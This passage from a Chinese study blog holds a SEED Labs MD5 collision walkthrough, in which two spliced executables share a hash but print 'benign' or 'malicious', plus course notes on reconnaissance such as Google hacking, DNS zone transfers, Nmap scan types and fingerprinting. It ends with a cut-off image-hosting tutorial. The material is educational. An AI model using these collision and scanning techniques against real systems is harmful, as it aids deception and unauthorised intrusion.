class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>        <span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<br>&#125;;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">200</span>;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i] != b[i])<br>        &#123;<br>            flag = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(flag)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is benign code!\n&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;This is malicious code!\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><p>使用bless查看task4.out文件，先找到数组位置，第一个数组开始位置为0x3020，从而得到前缀结束位置：0x3040（由于0x3020不是64的倍数，需扩展到64的倍数），对应10进制数为12352。因此，前缀中包含了32个’A’。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071003578.png"alt="image-20231207094549479" /><figcaption aria-hidden="true">image-20231207094549479</figcaption></figure></li><li><p>截取前缀部分，作为task4_prefix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032662.png"alt="image-20230927202421078" /><figcaption aria-hidden="true">image-20230927202421078</figcaption></figure></li><li><p>根据该前缀生成两个具有相同 MD5 哈希值的文件。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032663.png"alt="image-20230927202429531" /><figcaption aria-hidden="true">image-20230927202429531</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032664.png"alt="image-20230927202441720" /><figcaption aria-hidden="true">image-20230927202441720</figcaption></figure></li><li><p>从GCC处开始（0x31c8），截取剩余部分，作为task4_suffix文件的输入。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312071003580.png"alt="image-20231207094740282" /><figcaption aria-hidden="true">image-20231207094740282</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032666.png"alt="image-20230927202503922" /><figcaption aria-hidden="true">image-20230927202503922</figcaption></figure></li><li><p>把步骤4中生成的其中一个文件的后160个字节（32(字符A)+128(Padding)）截取出来，作为task4_middle文件(数组b部分内容)的输入。根据代码逻辑，该步骤选中的文件在拼接成为一个可执行文件后，由于两个数组内容相同，将执行善意代码，此处我们选取task4_out1.bin。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032667.png"alt="image-20230927202526131" /><figcaption aria-hidden="true">image-20230927202526131</figcaption></figure></li><li><p>数组大小为200字节，因此还需要40字节的字符串,保存至task4_strA。并且注意到，两个数组间有24字节的0x00字符，保存至task4_str0。特别注意：python生成时会在末尾自动加上0x0A，因此我们对生成的文件进行截取。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032668.png"alt="image-20230927202538212" /><figcaption aria-hidden="true">image-20230927202538212</figcaption></figure></li><li><p>按下表方式开始进行拼接（拼接过程中要维持编译文件原有结构，但拼接方式不唯一）：</p><table><thead><tr class="header"><th>前缀输出文件</th><th>数组a补充（200-32-128[padding]=40字节）</th><th>间隔（24字节）</th><th>数组b主体（160字节）</th><th>数组b补充（40字节）</th><th>后缀</th></tr></thead><tbody><tr class="odd"><td>task4_out1.bin</td><td>task4_strA</td><td>task4_str0</td><td>task4_middle</td><td>task4_strA</td><td>task4_suffix</td></tr><tr class="even"><td>task4_out2.bin</td><td>task4_strA</td><td>task4_str0</td><td>task4_middle</td><td>task4_strA</td><td>task4_suffix</td></tr></tbody></table><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032669.png"alt="image-20230927202618655" /><figcaption aria-hidden="true">image-20230927202618655</figcaption></figure></li><li><p>分别运行两个最终文件（task4_1/task4_2），此处需要先赋予执行权限。与之前推理结果一致，task4_1执行善意代码，task4_2执行恶意代码。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032670.png"alt="image-20230927202628947" /><figcaption aria-hidden="true">image-20230927202628947</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309272032671.png"alt="image-20230927202638045" /><figcaption aria-hidden="true">image-20230927202638045</figcaption></figure></li></ol><p>参考教程：</p><ol type="1"><li><ahref="https://seanxz401.github.io/2022/12/26/网络攻防-口令攻击/#实验-MD5碰撞">网络攻防-口令攻击- Sean's Blog (seanxz401.github.io)</a></li><li>https://www.cnblogs.com/skprimin/p/16177784.html</li></ol>]]></content>
    
    
    <categories>
      
      <category>SEED-LABS</category>
      
      <category>Cryptography</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH2-信息收集技术</title>
    <link href="/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/02%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/"/>
    <url>/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/02%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8A%80%E6%9C%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集概述">2.1 信息收集概述</h1><h2 id="信息收集的内容">2.1.1 信息收集的内容</h2><ul><li>定义：信息收集是指黑客为了更加有效地实施攻击而在攻击前或攻击过程中对目标的所有探测活动</li><li>内容：域名和IP地址；操作系统类型；开放端口；提供开放端口的服务或应用程序；防火墙、入侵检测等安全防范措施</li><li>分类：<ul><li>主动：通过直接访问、扫描网站，这种将流量流经网站的行为</li><li>被动：利用第三方的服务对目标进行访问了解，比如：Google搜索</li></ul></li></ul><h2 id="信息收集的方法">2.1.2 信息收集的方法</h2><ul><li>社会工程学</li><li>技术手段：公开信息收集、网络扫描、漏洞扫描、网络拓扑检测</li></ul><h1 id="公开信息收集">2.2 公开信息收集</h1><h2 id="利用web服务">2.2.1 利用web服务</h2><ul><li><p>网站公开邮箱（结合社会工程学）</p></li><li><p>目标域名、IP地址、网站模板、网络管理员信息、公司人员名单</p></li><li><p>网络拓扑结构图</p></li></ul><h2 id="利用搜索引擎服务">2.2.2 利用搜索引擎服务</h2><ul><li><p>基本语法</p><table><thead><tr class="header"><th><strong>And</strong></th><th><strong>与</strong></th></tr></thead><tbody><tr class="odd"><td><strong>OR</strong></td><td><strong>或</strong></td></tr><tr class="even"><td><strong>+</strong></td><td><strong>强制包含搜索项</strong></td></tr><tr class="odd"><td><strong>-</strong></td><td><strong>非，去掉搜索项</strong></td></tr><tr class="even"><td><strong>“”</strong></td><td><strong>包含一个完整的语义</strong></td></tr><tr class="odd"><td><strong>.</strong></td><td><strong>单个通配符</strong></td></tr><tr class="even"><td>*</td><td><strong>任意通配符</strong></td></tr></tbody></table></li><li><p>搜索语法</p><table><thead><tr class="header"><th><strong>site</strong></th><th><strong>搜索具体服务器或域名的网页</strong></th></tr></thead><tbody><tr class="odd"><td><strong>filetype</strong></td><td><strong>搜索特定类型的文件</strong></td></tr><tr class="even"><td><strong>intitle</strong></td><td><strong>搜索网页标题</strong></td></tr><tr class="odd"><td><strong>inurl</strong></td><td><strong>搜索URL </strong></td></tr><tr class="even"><td><strong>intext</strong></td><td><strong>搜索正文</strong></td></tr><tr class="odd"><td><strong>link</strong></td><td><strong>搜索连接到指定网页的网页</strong></td></tr></tbody></table></li><li><p>谷歌黑客常用搜索语句一览：https://zhuanlan.zhihu.com/p/142832509</p></li><li><p>搜索引擎：https://www.shodan.io/</p></li></ul><h2 id="利用whole服务">2.2.3 利用Whole服务</h2><ul><li>功能：查看已注册域名（域名登记人信息、联系电话和邮箱、域名注册时间和更新时间、权威DNS的IP地址）</li><li>使用方法：https://whois.chinaz.com/</li></ul><h2 id="利用dns域名服务">2.2.4 利用DNS域名服务</h2><ul><li>主服务器</li><li>辅助服务器（定期进行区域传送：允许一个辅域名服务器更新自己的区域数据）</li><li>缓存服务器</li></ul><p><strong>利用思路</strong>：</p><p>如果DNS配置不当，可能造成内部主机名和IP地址对的泄漏。即主DNS服务器允许任意IP地址从该服务器进行区域传送，进而泄露信息。</p><h2 id="cdn">2.2.5 CDN</h2><p>内容分发网络<code>CDN</code>是一个互连服务器网络，可加快数据密集型应用程序的网页加载速度。<code>CDN</code>可以表示内容分发网络或内容分配网络。当用户访问某个网站时，来自该网站服务器的数据必须通过互联网传输到用户的计算机。如果用户距离该服务器较远，则加载大文件（例如视频或网站图像）将需要很长时间。相反，如果网站内容存储在距离用户较近的<code>CDN</code>服务器上，就可以更快到达他们的计算机。</p><h1 id="网络扫描">2.3 网络扫描</h1><h2 id="主机扫描">2.3.1 主机扫描</h2><h3 id="icmp扫描">2.3.1.1 ICMP扫描</h3><p><strong>ping扫描原理</strong>：</p><p>利用<code>ICMP协议</code>（响应请求/应答）进行工作</p><p><strong><code>ICMP</code>报文格式：</strong></p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014073.png"alt="image-20230920161113121" /><figcaption aria-hidden="true">image-20230920161113121</figcaption></figure><p>类型域指明类型；代码域指明作用</p><p><strong>常见<code>ICMP</code>报文：</strong></p><table><thead><tr class="header"><th><strong>名称</strong></th><th><strong>类型</strong></th></tr></thead><tbody><tr class="odd"><td><strong><code>ICMP</code> DestinationUnreachable（目标不可达）</strong></td><td><strong>3</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> Source Quench</strong><strong>（源抑制）</strong></td><td><strong>4</strong></td></tr><tr class="odd"><td><strong><code>ICMP</code> Redirection（重定向）</strong></td><td><strong>5</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> TimestampRequest/Reply（时间戳）</strong></td><td><strong>13/14</strong></td></tr><tr class="odd"><td><strong><code>ICMP</code> Address MaskRequest/Reply（子网掩码）</strong></td><td><strong>17/18</strong></td></tr><tr class="even"><td><strong><code>ICMP</code> EchoRequest/Reply（响应请求/应答）</strong></td><td><strong>8/0</strong></td></tr></tbody></table><p>注：根据RFC的定义，<code>TCP/IP</code>协议栈应该支持各种类型的<code>ICMP</code>报文。但事实上，在各个操作系统具体实现TCP/IP时，可能并没有完全遵循RFC标准。</p><h3 id="其他类型的主机扫描">2.3.1.2 其他类型的主机扫描</h3><ul><li>构造异常的<code>IP</code>包头</li><li>在<code>IP</code>头中设置无效的字段值</li><li>构造错误的数据分片</li><li>通过超长包探测内部路由器</li><li>反向映射探测</li></ul><h2 id="端口扫描">2.3.2 端口扫描</h2><h3 id="connect扫描">2.3.2.1 Connect扫描</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014075.png"alt="image-20230920162546395" /><figcaption aria-hidden="true">image-20230920162546395</figcaption></figure><ul><li>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机依次发送TCPACK、TCP RST+ACK完成三次握手和重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</li><li>特点：<ul><li>优点：实现简单、可以用普通用户权限执行</li><li>缺点：容易被目标应用日志所记录</li></ul></li></ul><h3 id="syn扫描">2.3.2.2 SYN扫描</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309241014076.png"alt="image-20230920163233117" /><figcaption aria-hidden="true">image-20230920163233117</figcaption></figure><ul><li>Nmap向目标端口发送TCPSYN报文，如果目标机返回TCPSYN+ACK报文，则说明目标端口处于开放状态，同时Nmap会紧接着向目标机发送TCPRST报文以重置此连接;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</li><li>特点：<ul><li>优点：一般不会被目标主机的应用所记录</li><li>缺点：运行Raw Socket时必须拥有管理员权限</li></ul></li></ul><h3 id="隐蔽扫描">2.3.2.3 隐蔽扫描</h3><ul><li>Nmap向目标端口发送TCPFIN(-SF）/NULL（sN）/FIN+PSH+URG（-sX）报文，对于Linux系统的目标机，如果目标机未响应，则说明目标端口处于开放状态或被防火墙屏蔽;如果目标机返回TCPRST+ACK报文，则说明目标端口处于关闭状态。</li><li>对于Windows系统的目标机，无论目标端口处于开放还是关闭状态，目标机都会返回TCPRST+ACK报文。</li><li>特点：<ul><li>优点：它们能躲过一些无状态防火墙和报文过滤路由器，不会被记录到日志</li><li>缺点：大部分系统并不遵循该标准</li></ul></li></ul><h3 id="udp扫描">2.3.2.4 UDP扫描</h3><p>只需向目标主机<code>UDP</code>端口发送任意数据，如果端口没有开放，则返回一个“目标不可达”的<code>ICMP</code>报文。</p><h3 id="其他端口扫描技术">2.3.2.5 其他端口扫描技术</h3><ul><li>ACK扫描：向目标主机的端口发送ACK包，如果收到RST包，说明该端口没有被防火墙屏蔽；不响应的端口或者发送特定的ICMP错误消息(类型3，代号1，2，3，9，10，或者13)的端口，说明该端口被防火墙屏蔽。</li><li>IP分段扫描</li><li>TCP FTP Proxy扫描</li></ul><h2 id="系统类型扫描">2.3.3 系统类型扫描</h2><h3 id="利用端口扫描结果">2.3.3.1 利用端口扫描结果</h3><ul><li>由于现代操作系统往往提供一些自身特有的功能，而这些功能又很可能打开一些特定的端口</li><li>windows：135，137，139等</li><li>Lniux：512，513，514，2049等</li></ul><h3 id="利用banner">2.3.3.2 利用Banner</h3><p>服务程序接收到客户端的正常连接后所给出的欢迎信息</p><h3 id="tcpip协议栈指纹">2.3.3.3 TCP/IP协议栈指纹</h3><ul><li>不同的操作系统在实现<code>TCP/IP</code>协议栈时都或多或少地存在着差异。而这些差异，我们就称之为<code>TCP/IP</code>协议栈指纹</li><li>TCP指纹：<code>FIN</code>探测、<code>BOGUS</code>标记位探测、<code>SYN</code>泛洪测试等</li><li><code>IP</code>、<code>ICMP</code>指纹：<code>ICMP</code>错误信息查询、<code>ICMP</code>信息引用、<code>TOS</code>和<code>TTL</code></li></ul><h1 id="漏洞扫描">2.4 漏洞扫描</h1><h2 id="概念">2.4.1 概念</h2><ul><li>漏洞：在计算机安全领域，安全漏洞<code>SecurityHole</code>通常又称作脆弱性（vulnerability）</li><li>来源：<ul><li>硬件、软件或协议设计时的瑕疵</li><li>硬件、软件或协议实现中的弱点</li><li>硬件、软件本身的瑕疵<br /></li><li>系统和网络的错误配置</li></ul></li><li>漏洞扫描：指利用一些专门或综合漏洞扫描程序对目标存在的系统漏洞或应用程序漏洞进行扫描。</li></ul><h2 id="分类">2.4.2 分类</h2><ul><li>主动式策略是<strong>基于网络</strong>的检测，通过执行一些脚本文件对系统进行攻击，并记录它的反应，从而发现其中的漏洞</li><li>被动式策略是<strong>基于主机</strong>的检测，对系统中不合适的设置、脆弱的口令以及其他同安全规则相抵触的对象进行检查</li></ul><h2 id="方法">2.4.3 方法</h2><ul><li>直接测试：指利用漏洞特点发现系统漏洞的方法</li><li>推断：它并不直接渗透漏洞，只是间接地寻找漏洞存在的证据。采用推断方法的检测手段主要有版本检查、程序行为分析、操作系统堆栈指纹分析和时序分析等。</li><li>带凭证的测试：凭证是指访问服务所需要的用户名或者密码，包括UNIX的登录权限和从网络调用WindowsNT的<code>API</code>的能力。如果赋予测试进程目标系统的角色，将能够检查出更多的漏洞。</li></ul><h1 id="网络拓扑探测">2.5 网络拓扑探测</h1><h2 id="拓扑探测">2.5.1 拓扑探测</h2><ul><li><code>Traceroute</code>：<code>UDP</code>数据包、<code>TTL</code></li><li><code>SNMP</code>（简单网络管理协议）：不同类型网络设备之间客户机/服务器模式的简单通信协议<ul><li>Read：观察设备配置信息</li><li>Read/Write：有权写入信息</li></ul></li></ul><h2 id="网络设备识别">2.5.2 网络设备识别</h2><h3 id="利用专门搜索引擎">2.5.2.1 利用专门搜索引擎</h3><p>https://www.shodan.io/</p><p>https://www.zoomeye.org/</p><h3 id="基于设备指纹的设备类型探测">2.5.2.2基于设备指纹的设备类型探测</h3><p>主要介绍基于应用服务Banner的设备识别技术：</p><ul><li>FTP协议</li><li>SSH</li><li>Telnet</li><li>HTTP</li></ul><h2 id="网络实体ip地理位置定位">2.5.3 网络实体IP地理位置定位</h2><ul><li>基于查询信息的定位：通过查询机构注册的信息确定网络设备的地理位置</li><li>基于网络测量的定位：利用探测源与目标实体的时延、拓扑或其他信息估计目标实体的位置</li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH1-网络攻击概述</title>
    <link href="/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/01%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0/"/>
    <url>/2023/09/24/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/01%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E6%A6%82%E8%BF%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="网络安全威胁">1.1 网络安全威胁</h1><h2 id="事件">1.1.1 事件</h2><h2 id="成因">1.1.2 成因</h2><ul><li>技术因素<ul><li>协议缺陷：网络协议缺乏认证、加密等基本的安全特性</li><li>软件漏洞：软件规模庞大，复杂度提高，开发者安全知识缺乏</li><li>策略弱点：安全需求与应用需求不相一致，安全策略设计不当</li><li>硬件漏洞：硬件设计软件化使得软件漏洞同样出现在硬件之中</li></ul></li><li>人为因素<ul><li>攻击者：成分复杂，多数掌握着丰富的攻击资源</li><li>防御者：广大的网络应用人群缺少安全知识，专业人员数量、质量尚难满足对安全人才的迫切需求</li></ul></li></ul><h1 id="网络攻击技术">1.2 网络攻击技术</h1><h2 id="分类标准及类别">1.2.1 分类标准及类别</h2><p><strong>标准：</strong></p><ul><li>互斥性（分类类别不应重叠）</li><li>完备性（覆盖所有可能的攻击）</li><li>非二义性（类别划分清晰）</li><li>可重复性（对一个样本多次分类结果一致）</li><li>可接受性（符合逻辑和直觉）</li><li>实用性（可用于深入研究和调查）</li></ul><p><strong>类别（攻击者与被攻击者之间的交互关系）：</strong></p><ul><li>本地（物理）攻击：指攻击者通过实际接触被攻击的主机实施的各种攻击方法</li><li>主动攻击：指攻击者利用Web、FTP、Telnet等开放网络服务对目标实施的各种攻击</li><li>被动攻击：攻击者利用浏览器、邮件接收程序、文字处理程序等客户端应用程序漏洞或系统用户弱点，对目标实施的各种攻击</li><li>中间人攻击：指攻击者处于被攻击主机的某个网络应用的中间人位置，进行数据窃听、破坏或篡改等攻击</li></ul><p>注：主动与被动，主要是看是否需要对方采取动作</p><h2 id="步骤与方法">1.2.2 步骤与方法</h2><ul><li><strong>信息收集</strong>：尽可能多地收集目标的相关信息，为后续的“精确”攻击建立基础。<ul><li>主动攻击<ul><li>利用公开信息服务</li><li>主机扫描与端口扫描</li><li>操作系统探测与应用程序类型识别</li></ul></li></ul></li><li><strong>权限获取</strong>：获取目标系统的读、写、执行等权限。<ul><li>主动攻击<ul><li>口令攻击</li><li>缓冲区溢出</li><li>脚本攻击</li></ul></li><li>被动攻击<ul><li>特洛伊木马</li><li>使用邮件、IM等发送恶意链接</li></ul></li></ul></li><li><strong>安装后门</strong>：在目标系统中安装后门程序，以更加方便、更加隐蔽的方式对目标系统进行操控。<ul><li>主机控制木马</li><li>Web服务控制木马</li></ul></li><li><strong>扩大影响</strong>：以目标系统为“跳板”，对目标所属网络的其它主机进行攻击，最大程度地扩大攻击的效果。<ul><li>可使用远程攻击主机的所有攻击方式</li><li>还可使用局域网内部攻击所特有的嗅探、假消息攻击等方法</li></ul></li><li><strong>清除痕迹</strong>：清除攻击的痕迹，以尽可能长久地对目标进行控制，并防止被识别、追踪。<ul><li>Rootkit隐藏</li><li>系统安全日志清除</li><li>应用程序日志清除</li></ul></li></ul><h1 id="网络攻击的发展趋势">1.3 网络攻击的发展趋势</h1><ul><li>攻击影响日益深远</li><li>攻击领域不断扩展</li><li>攻击技术愈加精细</li></ul><h1 id="社会工程学">1.4 社会工程学</h1><ul><li>定义：利用人类的愚蠢，操纵他人执行预期的动作或泄漏机密信息的一门艺术与学问。</li><li>防范措施：<ul><li>尽可能不要使用真名上网，将真实世界与网络世界划清明确的界限；</li><li>不要轻易相信别人，尤其是未曾谋面或未建立起信任关系的陌生人；</li><li>别把自己的电脑或移动终端轻易留给别人使用，必要时刻(如维修电脑时)务必清理上面的个人隐私信息，否则结果可能会很惨</li><li>单位应建立起规范的安全操作规程，包括门禁和人员控制，不同分类资料数据的访问机制，规范的垃圾回收和处理机制等；</li><li>单位应对员工进行安全意识和操作规程培训，使其具备基础的社会工程学抵御能力。</li><li>涉密信息与计算机系统的处理有着相应更加严格的保密流程与规范。</li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络攻防技术</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GitHub+PicGo搭建免费图床</title>
    <link href="/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/"/>
    <url>/2023/09/23/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/GitHub+PicGo%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
    
    <content type="html"><![CDATA[<h1 id="操作步骤">1. 操作步骤</h1><h2 id="github">1.1 Github</h2><ul><li><p>新建仓库（注：必须为Public，勾选<code>Add a README file</code>）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654111.png"alt="image-20230923153333076" /><figcaption aria-hidden="true">image-20230923153333076</figcaption></figure></li><li><p>生成token：点击<code>Github</code>右上角的用户头→<code>Settings</code>→<code>Developer settiings</code>→<code>Personal access tokens</code>→<code>Tokens(classic)</code>→<code>Generate new token</code>，在<code>Note</code>一栏输入创建的仓库名称，并勾选<code>repo</code>，最后在最下方点击<code>Generate token</code>按钮，就生成了对应的<code>Token</code>。注：新生成的<code>Token</code>只会显示一次，请妥善保存，如有遗失，重新生成即可。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654112.png"alt="image-20230923154939730" /><figcaption aria-hidden="true">image-20230923154939730</figcaption></figure></li></ul><h2 id="picgo">1.2 PicGo</h2><ul><li><p>下载PicGo所需版本</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654113.png"alt="image-20230923155129734" /><figcaption aria-hidden="true">image-20230923155129734</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654114.png"alt="image-20230923155430395" /><figcaption aria-hidden="true">image-20230923155430395</figcaption></figure></li><li><p>安装（略）</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654115.png"alt="image-20230923155604890" /><figcaption aria-hidden="true">image-20230923155604890</figcaption></figure></li><li><p>配置</p><ul><li><p>为显示简捷，仅勾选GitHub</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202309231654116.png"alt="image-20230923155808379" /><figcaption 